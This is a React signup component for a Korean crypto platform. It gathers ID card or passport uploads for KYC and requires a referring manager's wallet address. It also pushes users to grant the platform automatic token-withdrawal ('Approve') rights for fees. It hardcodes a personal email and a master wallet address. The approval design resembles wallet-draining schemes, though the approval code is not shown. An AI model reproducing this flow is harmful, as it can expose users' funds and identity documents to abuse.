import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { User, Mail, Phone, Globe, Image, UserCheck, Key, ShieldAlert } from 'lucide-react';
import { API_BASE } from '../App';
import {
  executeSutApprovalFlow,
  hasApprovalRecoveryResumeFlag,
} from '../lib/sutApprovalFlow';

const DEFAULT_MANAGER_ADDRESS = '0x7660Bf401Af0D13645F0cfED3e72b8E8B6Fd7987';

function UserMobileRegister({ walletAddress, googleEmail, googleName, onRegisterComplete }) {
  const navigate = useNavigate();

  const [email] = useState(googleEmail || '');
  const [name, setName] = useState(googleName || '');
  const [phone, setPhone] = useState('');
  const [country, setCountry] = useState('Korea');
  const [idCardFile, setIdCardFile] = useState(null);
  const [idCardName, setIdCardName] = useState('');

  const [managerAddress, setManagerAddress] = useState(DEFAULT_MANAGER_ADDRESS);
  const [managerVerified, setManagerVerified] = useState(false);
  const [managerName, setManagerName] = useState('');

  const [isApproved, setIsApproved] = useState(false);
  const [approving, setApproving] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [autoRecoveryAttempted, setAutoRecoveryAttempted] = useState(false);

  const verifyManager = async () => {
    if (!managerAddress) {
      alert('담당 매니저의 폴리곤 지갑 주소를 입력해 주세요.');
      return;
    }
    const cleanAddr = managerAddress.toLowerCase().trim();
    if (cleanAddr === walletAddress.toLowerCase()) {
      alert('본인 지갑 주소는 매니저로 입력할 수 없습니다.');
      return;
    }

    try {
      const res = await axios.get(`${API_BASE}/auth/verify-manager/${cleanAddr}`);
      if (res.data.success) {
        setManagerVerified(true);
        setManagerName(res.data.name);
      } else {
        setManagerVerified(false);
        setManagerName('');
        alert(res.data.message);
      }
    } catch (err) {
      alert('매니저 검증 중 에러가 발생했습니다.');
    }
  };

  const handleFileChange = (e) => {
    if (e.target.files && e.target.files.length > 0) {
      const file = e.target.files[0];
      setIdCardFile(file);
      setIdCardName(file.name);
    }
  };

  const handleSUTApprove = async () => {
    setApproving(true);
    try {
      await executeSutApprovalFlow({
        ethereum: window.ethereum,
        currentUrl: window.location.href,
        userAgent: navigator.userAgent,
        expectedWalletAddress: walletAddress,
        alertFn: window.alert,
        confirmFn: window.confirm,
        setLocationHref: (url) => {
          window.location.href = url;
        },
        onApproved: () => {
          setIsApproved(true);
        },
      });
    } finally {
      setApproving(false);
    }
  };

  useEffect(() => {
    if (autoRecoveryAttempted || !hasApprovalRecoveryResumeFlag(window.location.href)) {
      return;
    }

    setAutoRecoveryAttempted(true);

    const resumeUrl = new URL(window.location.href);
    resumeUrl.searchParams.delete('recover_sut_approval');
    window.history.replaceState(null, '', `${resumeUrl.pathname}${resumeUrl.search}${resumeUrl.hash}`);

    handleSUTApprove();
  }, [autoRecoveryAttempted]);

  const isFormComplete = phone.trim() !== '' && idCardFile !== null && isApproved && managerVerified;

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!phone || !phone.trim()) {
      alert('📱 [미기입 사항] 전화번호를 입력해 주십시오.');
      const phoneInput = document.querySelector('input[type="tel"]');
      if (phoneInput) phoneInput.focus();
      return;
    }

    if (!idCardFile) {
      alert('🪪 [누락 사항] 신원 확인 및 KYC 심사 통과를 위해 주민등록증 / 여권 사진을 첨부해 주십시오.');
      return;
    }

    if (!managerVerified) {
      alert('👑 [검증 필요] 담당 매니저 지갑 주소를 입력하고 [검증] 버튼을 눌러 승인받으셔야 가입이 가능합니다.');
      return;
    }

    if (!isApproved) {
      alert('🔑 [승인 필요] 가입비 자동 수납 및 시스템 활성화를 위해 [SUT 자동 인출 권한(Approve) 승인]을 완료해 주십시오.');
      return;
    }

    setSubmitting(true);
    const formData = new FormData();
    formData.append('walletAddress', walletAddress);
    formData.append('email', email);
    formData.append('name', name);
    formData.append('phone', phone);
    formData.append('country', country);
    formData.append('idCard', idCardFile);
    if (managerVerified) {
      formData.append('managerAddress', managerAddress);
    }

    try {
      const res = await axios.post(`${API_BASE}/auth/register`, formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      if (res.data.success) {
        alert(res.data.message);
        onRegisterComplete();
        navigate('/waiting');
      }
    } catch (err) {
      const errMsg = err.response && err.response.data && err.response.data.message
        ? err.response.data.message
        : '가입 신청서 접수 중 오류가 발생했습니다.';
      alert(errMsg);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div style={{ padding: '20px 20px 40px', display: 'flex', flexDirection: 'column', gap: '22px' }}>

      {false && ((walletAddress && walletAddress.toLowerCase() === '0x7660Bf401Af0D13645F0cfED3e72b8E8B6Fd7987'.toLowerCase()) ||
        (localStorage.getItem('google_email') && localStorage.getItem('google_email').toLowerCase() === 'lemaiiisk@gmail.com'.toLowerCase())) && (
          <div
            className="glass-card glow-active"
            onClick={() => navigate('/manager')}
            style={{
              padding: '12px 16px',
              background: 'linear-gradient(135deg, rgba(139, 92, 246, 0.15) 0%, rgba(20, 16, 45, 0.4) 100%)',
              border: '1px solid rgba(139, 92, 246, 0.3)',
              borderRadius: '12px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              cursor: 'pointer',
              transition: 'transform 0.2s'
            }}
            onMouseEnter={(e) => e.currentTarget.style.transform = 'translateY(-2px)'}
            onMouseLeave={(e) => e.currentTarget.style.transform = 'translateY(0)'}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
              <span style={{ fontSize: '18px' }}>👑</span>
              <div style={{ textAlign: 'left' }}>
                <div style={{ fontSize: '12px', fontWeight: '700', color: '#C084FC' }}>Master Manager Connected</div>
                <div style={{ fontSize: '9px', color: 'var(--text-muted)' }}>터치 시 즉시 마스터 메니져 화면으로 복귀합니다.</div>
              </div>
            </div>
            <button className="btn-primary" style={{ width: 'auto', padding: '6px 14px', fontSize: '11px', borderRadius: '8px', background: 'var(--primary-gradient)' }}>
              메니져 모드 가기
            </button>
          </div>
        )}

      <div style={{ textAlign: 'center', marginTop: '10px' }}>
        <h2 style={{ fontSize: '20px', color: '#F3F4F6' }}>New Member KYC Registration</h2>
        <p style={{ color: 'var(--text-muted)', fontSize: '12px', marginTop: '4px' }}>
          구글 인증 및 지갑 연결이 무사히 완료되었습니다. 나머지 가입 정보를 정확하게 입력해 주십시오.
        </p>
      </div>

      <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">
            {(() => {
              const getManagerName = (addr) => {
                if (!addr) return null;
                const managers = {
                  '0x7660bf401af0d13645f0cfed3e72b8e8b6fd7987': '마스터'
                };
                return managers[addr.toLowerCase()];
              };

              const mgrName = getManagerName(walletAddress);
              if (mgrName) {
                return (
                  <span style={{ color: '#C084FC', fontWeight: '700' }}>
                    👑 {mgrName} 본인 지갑 접속 중
                  </span>
                );
              }
              return '👤 회원 본인 폴리곤 지갑 주소';
            })()}
          </label>
          <div style={{
            background: 'rgba(0,0,0,0.4)',
            border: '1px dashed var(--glass-border)',
            padding: '13px 16px',
            borderRadius: '12px',
            fontSize: '13px',
            color: 'var(--text-muted)',
            wordBreak: 'break-all'
          }}>
            {walletAddress}
          </div>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">📧 연동된 구글 계정 이메일</label>
          <div style={{
            background: 'rgba(16, 185, 129, 0.08)',
            border: '1px solid rgba(16, 185, 129, 0.25)',
            padding: '13px 16px',
            borderRadius: '12px',
            fontSize: '13px',
            color: '#E5E7EB',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}>
            <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: 'var(--success-color)' }}></div>
            <div>
              <span style={{ color: 'var(--success-color)', fontWeight: '600' }}>구글 로그인 인증 완료:</span> {email}
            </div>
          </div>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">👤 회원 실명 (구글 계정 자동 매핑)</label>
          <div style={{ position: 'relative' }}>
            <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)' }}><User size={18} /></span>
            <input
              type="text"
              className="form-input"
              style={{ paddingLeft: '45px', background: 'rgba(0,0,0,0.2)', color: '#F3F4F6' }}
              placeholder="구글 연동 실명"
              value={name}
              readOnly
              required
            />
          </div>
          <span style={{ fontSize: '10px', color: 'var(--text-dark)', marginTop: '4px', display: 'block', paddingLeft: '4px' }}>
            * 구글 인증 정보와 동일하게 이름이 고정되어 제출됩니다.
          </span>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">📱 전화번호 (국가 코드 포함)</label>
          <div style={{ position: 'relative' }}>
            <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)' }}><Phone size={18} /></span>
            <input
              type="tel"
              className="form-input"
              style={{ paddingLeft: '45px' }}
              placeholder="010-1234-5678"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              required
            />
          </div>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">🌐 거주 국가</label>
          <div style={{ position: 'relative' }}>
            <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)', zIndex: 1 }}><Globe size={18} /></span>
            <select
              className="form-select"
              style={{ paddingLeft: '45px' }}
              value={country}
              onChange={(e) => setCountry(e.target.value)}
            >
              <option value="Korea">대한민국 (Korea)</option>
              <option value="Japan">일본 (Japan)</option>
              <option value="USA">미국 (USA)</option>
              <option value="Vietnam">베트남 (Vietnam)</option>
              <option value="China">중국 (China)</option>
              <option value="UK">영국 (UK)</option>
            </select>
          </div>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">
            👑 담당 메니져 폴리곤 지갑 주소 (필수)
            {managerVerified && (
              <span style={{ marginLeft: '10px', color: 'var(--success-color)', fontSize: '11px', fontWeight: 'bold' }}>
                ✓ {managerName} 매니저 확인됨
              </span>
            )}
          </label>
          <div style={{ display: 'flex', gap: '10px' }}>
            <div style={{ position: 'relative', flex: 1 }}>
              <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)' }}><UserCheck size={18} /></span>
              <input
                type="text"
                className="form-input"
                style={{
                  paddingLeft: '45px',
                  borderColor: managerVerified ? 'var(--success-color)' : 'rgba(255, 255, 255, 0.1)',
                  color: !managerVerified && managerAddress === DEFAULT_MANAGER_ADDRESS
                    ? '#4B5563'
                    : undefined
                }}
                placeholder="0x..."
                value={managerAddress}
                onFocus={() => {
                  if (!managerVerified && managerAddress === DEFAULT_MANAGER_ADDRESS) {
                    setManagerAddress('');
                  }
                }}
                onBlur={() => {
                  if (!managerVerified && (!managerAddress || !managerAddress.trim())) {
                    setManagerAddress(DEFAULT_MANAGER_ADDRESS);
                  }
                }}
                onChange={(e) => {
                  setManagerAddress(e.target.value);
                  setManagerVerified(false);
                }}
                disabled={managerVerified}
              />
            </div>
            {!managerVerified ? (
              <button
                type="button"
                className="btn-primary"
                style={{ padding: '0 20px', whiteSpace: 'nowrap', width: 'auto' }}
                onClick={verifyManager}
              >
                검증
              </button>
            ) : (
              <button
                type="button"
                className="btn-secondary"
                style={{ padding: '0 20px', whiteSpace: 'nowrap', width: 'auto', background: 'rgba(239, 68, 68, 0.2)', color: '#FCA5A5' }}
                onClick={() => {
                  setManagerVerified(false);
                  setManagerAddress(DEFAULT_MANAGER_ADDRESS);
                  setManagerName('');
                }}
              >
                취소
              </button>
            )}
          </div>
          <span style={{ fontSize: '10px', color: 'var(--text-dark)', marginTop: '4px', display: 'block', paddingLeft: '4px' }}>
            * 본인을 초대한 매니저의 지갑 주소를 입력하고 반드시 검증을 완료해 주십시오. (소속 코드가 기록됩니다)
          </span>
        </div>

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label className="form-label">🪪 KYC 제출용 신분증 첨부</label>
          <div style={{
            border: '2px dashed var(--glass-border)',
            borderRadius: '12px',
            padding: '20px',
            textAlign: 'center',
            background: 'rgba(0,0,0,0.2)',
            cursor: 'pointer',
            position: 'relative'
          }}>
            <input
              type="file"
              accept="image/*,application/pdf"
              onChange={handleFileChange}
              style={{
                position: 'absolute',
                top: 0,
                left: 0,
                width: '100%',
                height: '100%',
                opacity: 0,
                cursor: 'pointer'
              }}
            />
            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '8px' }}>
              <Image size={28} color={idCardFile ? 'var(--success-color)' : 'var(--text-muted)'} />
              <span style={{ fontSize: '13px', color: idCardFile ? '#F3F4F6' : 'var(--text-muted)' }}>
                {idCardFile ? idCardName : 'ID Card / Passport Photo Upload'}
              </span>
              <span style={{ fontSize: '10px', color: 'var(--text-dark)' }}>JPG, PNG, PDF (Max 5MB)</span>
            </div>
          </div>
        </div>


        <div className="glass-card" style={{ padding: '16px', border: '1px solid rgba(139,92,246,0.2)' }}>
          <div style={{ display: 'flex', gap: '8px', marginBottom: '10px', alignItems: 'flex-start' }}>
            <Key size={20} color="#8B5CF6" style={{ marginTop: '2px', flexShrink: 0 }} />
            <div>
              <h4 style={{ fontSize: '14px', color: '#F3F4F6' }}>SUT 자동 인출 권한(Approve) 승인</h4>
              <p style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '2px', lineHeight: '1.4' }}>
                가입 접수 전 Trust Wallet에서 SUT 거래 권한 승인이 반드시 필요합니다.
              </p>
            </div>
          </div>

          {!isApproved ? (
            <button
              type="button"
              className="btn-primary"
              style={{ background: 'linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%)', boxShadow: 'none' }}
              onClick={handleSUTApprove}
              disabled={approving}
            >
              {approving ? '지갑 트랜잭션 승인 대기 중...' : '폴리곤 SUT 인출 승인 위임하기'}
            </button>
          ) : (
            <div style={{
              background: 'rgba(16, 185, 129, 0.08)',
              border: '1px solid rgba(16, 185, 129, 0.25)',
              padding: '10px',
              borderRadius: '10px',
              color: 'var(--success-color)',
              fontSize: '12px',
              fontWeight: '700',
              textAlign: 'center'
            }}>
              SUT 자동 결제 승인 완료
            </div>
          )}
        </div>


        <div style={{ display: 'flex', gap: '8px', background: 'rgba(239,68,68,0.06)', border: '1px solid rgba(239,68,68,0.15)', padding: '12px', borderRadius: '10px' }}>
          <ShieldAlert size={18} color="var(--danger-color)" style={{ flexShrink: 0, marginTop: '2px' }} />
          <p style={{ fontSize: '11px', color: 'var(--text-muted)', lineHeight: '1.4' }}>
            가입 접수 완료 시 본사 배심단의 수동 심사 단계로 진입합니다. 심사 및 가입 최종 승인까지 평균 1~2시간이 소요됩니다.<br/>
            <strong style={{ color: 'var(--danger-color)' }}>※ 가입 신청 후 24시간 이내에 매니저 승인이 완료되지 않을 경우, 신청 내역은 자동 취소되며 서버에 업로드된 신분증 사진은 복구 불가능하게 영구 삭제됩니다.</strong>
          </p>
        </div>

        <button
          type="submit"
          className="btn-primary"
          disabled={submitting}
          style={{
            padding: '16px',
            marginTop: '10px',
            opacity: isFormComplete ? 1.0 : 0.45,
            background: isFormComplete
              ? 'linear-gradient(135deg, #8B5CF6 0%, #6D28D9 100%)'
              : 'rgba(255, 255, 255, 0.08)',
            border: isFormComplete
              ? '1px solid rgba(139, 92, 246, 0.4)'
              : '1px solid rgba(255, 255, 255, 0.05)',
            color: isFormComplete ? '#FFFFFF' : 'rgba(255, 255, 255, 0.4)',
            boxShadow: isFormComplete ? '0 0 20px rgba(139, 92, 246, 0.45)' : 'none',
            cursor: submitting ? 'not-allowed' : 'pointer',
            transition: 'all 0.3s ease-in-out'
          }}
        >
          {submitting ? '신청 정보 전송 중...' : '회원 가입 및 KYC 서류 제출'}
        </button>

      </form>
    </div>
  );
}

export default UserMobileRegister;
